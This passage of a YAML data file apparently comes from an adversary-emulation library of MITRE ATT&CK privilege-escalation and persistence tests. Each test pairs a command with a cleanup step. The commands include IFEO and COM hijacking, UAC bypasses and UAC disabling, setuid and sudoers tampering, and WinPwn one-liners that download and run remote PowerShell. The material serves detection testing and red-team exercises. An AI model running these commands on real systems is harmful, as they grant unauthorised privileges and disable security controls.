      platform: windows
      command: |-
        New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" -Name "AtomicRedTeamT1546.011" -Value "AtomicRedTeamT1546.011"
        New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" -Name "AtomicRedTeamT1546.011" -Value "AtomicRedTeamT1546.011"
      cleanup: |-
        Remove-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" -Name "AtomicRedTeamT1546.011" -ErrorAction Ignore
        Remove-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" -Name "AtomicRedTeamT1546.011" -ErrorAction Ignore
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1546/011
  is_safe: false
- id: T1546.012
  name: Image File Execution Options Injection
  description: |-
    Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <code>C:\dbg\ntsd.exe -g  notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010)

    IFE...
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: IFEO Add Debugger
      type: cmd
      platform: windows
      command: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /d "C:\Windows\System32\cmd.exe"
      cleanup: reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: IFEO Global Flags
      type: cmd
      platform: windows
      command: |-
        REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
        REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
        REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\Windows\System32\cmd.exe"
      cleanup: |-
        reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /f >nul 2>&1
        reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /f >nul 2>&1
        reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: GlobalFlags in Image File Execution Options
      type: powershell
      platform: windows
      command: "$Name = \"GlobalFlag\"\n$Value = \"512\"\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\whoami.exe\"\nNew-Item -Path $registryPath -Force\nNew-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force\n$Name = \"ReportingMode\"\n$Value = \"1\"\n$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\whoami.exe\"\nNew-Item -Path $SilentProcessExit -Force\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force \n\n$Name = \"MonitorProcess\"\n$Value = \"cmd.exe /c calc.exe\"\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force\nStart-Process whoami.exe"
      cleanup: "$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\whoami.exe\" \nRemove-Item $SilentProcessExit -force\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\whoami.exe\"\nRemove-Item $registryPath -force"
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1546/012
  is_safe: false
- id: T1546.013
  name: PowerShell Profile
  description: |-
    Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.

    [PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles...
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: Append malicious start-process cmdlet
      type: powershell
      platform: windows
      command: |-
        Add-Content $profile -Value ""
        Add-Content $profile -Value "Start-Process calc.exe"
        powershell -Command exit
      cleanup: |-
        $oldprofile = cat $profile | Select-Object -skiplast 1
        Set-Content $profile -Value $oldprofile
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1546/013
  is_safe: false
- id: T1546.014
  name: Emond
  description: |-
    Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.

    The rule f...
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - macos
  executors:
    - name: Persistance with Event Monitor - emond
      type: sh
      platform: macos
      command: |-
        sudo cp "PathToAtomicsFolder/T1546.014/src/T1546.014_emond.plist" /etc/emond.d/rules/T1546.014_emond.plist
        sudo touch /private/var/db/emondClients/T1546.014
      cleanup: |-
        sudo rm /etc/emond.d/rules/T1546.014_emond.plist
        sudo rm /private/var/db/emondClients/T1546.014
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1546/014
  is_safe: false
- id: T1546.015
  name: Component Object Model Hijacking
  description: "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. \n\nAdversaries may use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the CO..."
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: COM Hijacking - InprocServer32
      type: powershell
      platform: windows
      command: |-
        New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Value 'MSAA AccPropServices'
        New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32' -Value "PathToAtomicsFolder\..\ExternalPayloads\AtomicTest.dll"
        New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32' -Name 'ThreadingModel' -Value 'Apartment' -PropertyType "String"
        Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'
      cleanup: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Recurse -ErrorAction Ignore
      timeout: 120
    - name: Powershell Execute COM Object
      type: powershell
      platform: windows
      command: |-
        $o= [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39"))
        $item = $o.Item()
        $item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
      cleanup: Get-Process -Name "*calc" | Stop-Process
      timeout: 120
    - name: COM Hijacking with RunDLL32 (Local Server Switch)
      type: powershell
      platform: windows
      command: |-
        New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Value 'MSAA AccPropServices'
        New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32' -Value "PathToAtomicsFolder\..\ExternalPayloads\T1546.015_calc.dll"
        New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32' -Name 'ThreadingModel' -Value 'Both' -PropertyType "String"
        Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-localserver {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'
      cleanup: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Recurse -ErrorAction Ignore
      timeout: 120
    - name: COM hijacking via TreatAs
      type: powershell
      platform: windows
      command: |-
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest" /ve /T REG_SZ /d "AtomicTest" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00" /ve /T REG_SZ /d "AtomicTest" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /T REG_SZ /d "AtomicTest" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /T REG_SZ /d "C:\WINDOWS\system32\scrobj.dll" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /T REG_SZ /d "Apartment" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID" /ve /T REG_SZ /d "AtomicTest" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /T REG_SZ /d "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID" /ve /T REG_SZ /d "AtomicTest" /f

        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f

        rundll32.exe -sta "AtomicTest"
      cleanup: |-
        reg delete "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest" /f
        reg delete "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /f
        reg delete "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}" /f
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1546/015
  is_safe: false
- id: T1548.001
  name: Setuid and Setgid
  description: 'An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.(Citation: setuid man page) Normally an application is run in the current user’s context, regardless of which user or group owns the applicat...'
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - defense-evasion
  platforms:
    - linux
    - macos
  executors:
    - name: Make and modify binary from C source
      type: sh
      platform: macos
      command: |-
        cp PathToAtomicsFolder/T1548.001/src/hello.c /tmp/hello.c
        sudo chown root /tmp/hello.c
        sudo make /tmp/hello
        sudo chown root /tmp/hello
        sudo chmod u+s /tmp/hello
        /tmp/hello
      cleanup: |-
        sudo rm /tmp/hello
        sudo rm /tmp/hello.c
      timeout: 60
      elevation_required: true
    - name: Make and modify binary from C source
      type: sh
      platform: linux
      command: |-
        cp PathToAtomicsFolder/T1548.001/src/hello.c /tmp/hello.c
        sudo chown root /tmp/hello.c
        sudo make /tmp/hello
        sudo chown root /tmp/hello
        sudo chmod u+s /tmp/hello
        /tmp/hello
      cleanup: |-
        sudo rm /tmp/hello
        sudo rm /tmp/hello.c
      timeout: 60
      elevation_required: true
    - name: Make and modify binary from C source (freebsd)
      type: sh
      platform: linux
      command: |-
        cp PathToAtomicsFolder/T1548.001/src/hello.c /tmp/hello.c
        chown root /tmp/hello.c
        make /tmp/hello
        chown root /tmp/hello
        chmod u+s /tmp/hello
        /tmp/hello
      cleanup: |-
        rm /tmp/hello
        rm /tmp/hello.c
      timeout: 60
      elevation_required: true
    - name: Set a SetUID flag on file
      type: sh
      platform: macos
      command: |-
        sudo touch /tmp/evilBinary
        sudo chown root /tmp/evilBinary
        sudo chmod u+xs /tmp/evilBinary
      cleanup: sudo rm /tmp/evilBinary
      timeout: 60
      elevation_required: true
    - name: Set a SetUID flag on file
      type: sh
      platform: linux
      command: |-
        sudo touch /tmp/evilBinary
        sudo chown root /tmp/evilBinary
        sudo chmod u+xs /tmp/evilBinary
      cleanup: sudo rm /tmp/evilBinary
      timeout: 60
      elevation_required: true
    - name: Set a SetUID flag on file (freebsd)
      type: sh
      platform: linux
      command: |-
        touch /tmp/evilBinary
        chown root /tmp/evilBinary
        chmod u+xs /tmp/evilBinary
      cleanup: rm /tmp/evilBinary
      timeout: 60
      elevation_required: true
    - name: Set a SetGID flag on file
      type: sh
      platform: macos
      command: |-
        sudo touch /tmp/evilBinary
        sudo chown root /tmp/evilBinary
        sudo chmod g+xs /tmp/evilBinary
      cleanup: sudo rm /tmp/evilBinary
      timeout: 60
      elevation_required: true
    - name: Set a SetGID flag on file
      type: sh
      platform: linux
      command: |-
        sudo touch /tmp/evilBinary
        sudo chown root /tmp/evilBinary
        sudo chmod g+xs /tmp/evilBinary
      cleanup: sudo rm /tmp/evilBinary
      timeout: 60
      elevation_required: true
    - name: Set a SetGID flag on file (freebsd)
      type: sh
      platform: linux
      command: |-
        touch /tmp/evilBinary
        chown root /tmp/evilBinary
        chmod g+xs /tmp/evilBinary
      cleanup: rm /tmp/evilBinary
      timeout: 60
      elevation_required: true
    - name: Make and modify capabilities of a binary
      type: sh
      platform: linux
      command: |-
        cp PathToAtomicsFolder/T1548.001/src/cap.c /tmp/cap.c
        make /tmp/cap
        sudo setcap cap_setuid=ep /tmp/cap
        /tmp/cap
      cleanup: |-
        rm /tmp/cap
        rm /tmp/cap.c
      timeout: 60
      elevation_required: true
    - name: Provide the SetUID capability to a file
      type: sh
      platform: linux
      command: |-
        touch /tmp/evilBinary
        sudo setcap cap_setuid=ep /tmp/evilBinary
      cleanup: rm /tmp/evilBinary
      timeout: 60
      elevation_required: true
    - name: Do reconnaissance for files that have the setuid bit set
      type: sh
      platform: linux
      command: find /usr/bin -perm -4000
      timeout: 60
    - name: Do reconnaissance for files that have the setgid bit set
      type: sh
      platform: linux
      command: find /usr/bin -perm -2000
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1548/001
  is_safe: false
- id: T1548.002
  name: Bypass User Account Control
  description: Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click thr...
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - defense-evasion
  platforms:
    - windows
  executors:
    - name: Bypass UAC using Event Viewer (cmd)
      type: cmd
      platform: windows
      command: |-
        reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
        cmd.exe /c eventvwr.msc
      cleanup: reg.exe delete hkcu\software\classes\mscfile /f >nul 2>&1
      timeout: 120
    - name: Bypass UAC using Event Viewer (PowerShell)
      type: powershell
      platform: windows
      command: |-
        New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
        Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
        Start-Process "C:\Windows\System32\eventvwr.msc"
      cleanup: Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse -ErrorAction Ignore
      timeout: 120
    - name: Bypass UAC using Fodhelper
      type: cmd
      platform: windows
      command: |-
        reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
        reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
        fodhelper.exe
      cleanup: reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
      timeout: 120
    - name: Bypass UAC using Fodhelper - PowerShell
      type: powershell
      platform: windows
      command: |-
        New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
        New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
        Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
        Start-Process "C:\Windows\System32\fodhelper.exe"
      cleanup: Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
      timeout: 120
    - name: Bypass UAC using ComputerDefaults (PowerShell)
      type: powershell
      platform: windows
      command: |-
        New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
        New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
        Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
        Start-Process "C:\Windows\System32\ComputerDefaults.exe"
      cleanup: Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
      timeout: 120
    - name: Bypass UAC by Mocking Trusted Directories
      type: cmd
      platform: windows
      command: |-
        mkdir "\\?\C:\Windows \System32\"
        copy "C:\Windows\System32\cmd.exe" "\\?\C:\Windows \System32\mmc.exe"
        mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
      cleanup: |-
        rd "\\?\C:\Windows \" /S /Q >nul 2>nul
        del "c:\testbypass.exe" >nul 2>nul
      timeout: 120
      elevation_required: true
    - name: Bypass UAC using sdclt DelegateExecute
      type: powershell
      platform: windows
      command: |-
        New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value 'cmd.exe /c notepad.exe'
        New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
        Start-Process -FilePath $env:windir\system32\sdclt.exe
        Start-Sleep -s 3
      cleanup: Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse -Force -ErrorAction Ignore
      timeout: 120
    - name: Disable UAC using reg.exe
      type: cmd
      platform: windows
      command: reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
      cleanup: reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
      timeout: 120
      elevation_required: true
    - name: Bypass UAC using SilentCleanup task
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\T1548.002\src\T1548.002.bat"'
      timeout: 120
    - name: UACME Bypass Method 23
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\uacme\23 Akagi64.exe"'
      cleanup: |-
        powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
        powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
      timeout: 120
    - name: UACME Bypass Method 31
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\uacme\31 Akagi64.exe"'
      cleanup: |-
        powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
        powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
      timeout: 120
    - name: UACME Bypass Method 33
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\uacme\33 Akagi64.exe"'
      cleanup: |-
        powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
        powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
      timeout: 120
    - name: UACME Bypass Method 34
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\uacme\34 Akagi64.exe"'
      cleanup: |-
        powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
        powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
      timeout: 120
    - name: UACME Bypass Method 39
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\uacme\39 Akagi64.exe"'
      cleanup: |-
        powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
        powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
      timeout: 120
    - name: UACME Bypass Method 56
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\uacme\56 Akagi64.exe"'
      cleanup: |-
        powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
        powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
      timeout: 120
    - name: UACME Bypass Method 59
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\uacme\59 Akagi64.exe"'
      cleanup: |-
        powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
        powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
      timeout: 120
    - name: UACME Bypass Method 61
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\uacme\61 Akagi64.exe"'
      cleanup: |-
        powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
        powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
      timeout: 120
    - name: WinPwn - UAC Magic
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique magic
      timeout: 120
    - name: WinPwn - UAC Bypass ccmstp technique
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        UACBypass -noninteractive -command "C:\windows\system32\calc.exe" -technique ccmstp
      timeout: 120
    - name: WinPwn - UAC Bypass DiskCleanup technique
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique DiskCleanup
      timeout: 120
    - name: WinPwn - UAC Bypass DccwBypassUAC technique
      type: powershell
      platform: windows
      command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')
      timeout: 120
    - name: Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key
      type: powershell
      platform: windows
      command: |-
        $orgValue =(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin
        Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force
      cleanup: Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value $orgValue -Type Dword -Force
      timeout: 120
      elevation_required: true
    - name: UAC Bypass with WSReset Registry Modification
      type: powershell
      platform: windows
      command: |-
        New-Item HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command -Force | Out-Null
        New-ItemProperty -Path HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command -Name "DelegateExecute" -Value "" -Force | Out-Null
        Set-ItemProperty -Path HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command -Name "(default)" -Value "C:\Windows\System32\cmd.exe /c start cmd.exe" -Force -ErrorAction SilentlyContinue | Out-Null
        $Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden
      cleanup: Remove-Item HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command -Recurse -Force
      timeout: 120
    - name: Disable UAC - Switch to the secure desktop when prompting for elevation via registry key
      type: powershell
      platform: windows
      command: Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force
      cleanup: Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 1 -Type Dword -Force
      timeout: 120
      elevation_required: true
    - name: Disable UAC notification via registry keys
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Microsoft\Security Center" /v UACDisableNotify /t REG_DWORD /d 1 /f
      cleanup: reg add "HKLM\SOFTWARE\Microsoft\Security Center" /v UACDisableNotify /t REG_DWORD /d 0 /f
      timeout: 120
    - name: Disable ConsentPromptBehaviorAdmin via registry keys
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
      cleanup: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f
      timeout: 120
    - name: UAC bypassed by Utilizing ProgIDs registry.
      type: cmd
      platform: windows
      command: |-
        reg add "HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command" /ve /d "C:\Windows\System32\calc.exe" /f

        reg add "HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer" /ve /d ".pwn" /f

        echo Triggering fodhelper.exe for potential privilege escalation...
        start fodhelper.exe
      cleanup: |-
        reg delete "HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command" /ve /f
        reg delete "HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer" /ve /f
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1548/002
  is_safe: false
- id: T1548.003
  name: Sudo and Sudo Caching
  description: |-
    Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.

    Within Linux and MacOS systems, sudo (sometimes referred to as "superuser do") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command "allows a system administrator to delegate authority to give certa...
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - defense-evasion
  platforms:
    - linux
    - macos
  executors:
    - name: Sudo usage
      type: sh
      platform: macos
      command: "sudo -l      \nsudo cat /etc/sudoers\nsudo vim /etc/sudoers"
      timeout: 60
      elevation_required: true
    - name: Sudo usage
      type: sh
      platform: linux
      command: "sudo -l      \nsudo cat /etc/sudoers\nsudo vim /etc/sudoers"
      timeout: 60
      elevation_required: true
    - name: Sudo usage (freebsd)
      type: sh
      platform: linux
      command: "sudo -l      \nsudo cat /usr/local/etc/sudoers\nsudo ee /usr/local/etc/sudoers"
      timeout: 60
      elevation_required: true
    - name: Unlimited sudo cache timeout
      type: sh
      platform: macos
      command: |-
        sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
        sudo visudo -c -f /etc/sudoers
      timeout: 60
      elevation_required: true
    - name: Unlimited sudo cache timeout
      type: sh
      platform: linux
      command: |-
        sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
        sudo visudo -c -f /etc/sudoers
      timeout: 60
      elevation_required: true
    - name: Unlimited sudo cache timeout (freebsd)
      type: sh
      platform: linux
      command: |-
        sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers
        sudo visudo -c -f /usr/local/etc/sudoers
      timeout: 60
      elevation_required: true
    - name: Disable tty_tickets for sudo caching
      type: sh
      platform: macos
      command: |-
        sudo sh -c "echo Defaults "'!'"tty_tickets >> /etc/sudoers"
        sudo visudo -c -f /etc/sudoers
      timeout: 60
      elevation_required: true
    - name: Disable tty_tickets for sudo caching
      type: sh
      platform: linux
      command: |-
        sudo sh -c "echo Defaults "'!'"tty_tickets >> /etc/sudoers"
        sudo visudo -c -f /etc/sudoers
      timeout: 60
      elevation_required: true
    - name: Disable tty_tickets for sudo caching (freebsd)
      type: sh
      platform: linux
      command: |-
        sudo sh -c "echo Defaults "'!'"tty_tickets >> /usr/local/etc/sudoers"
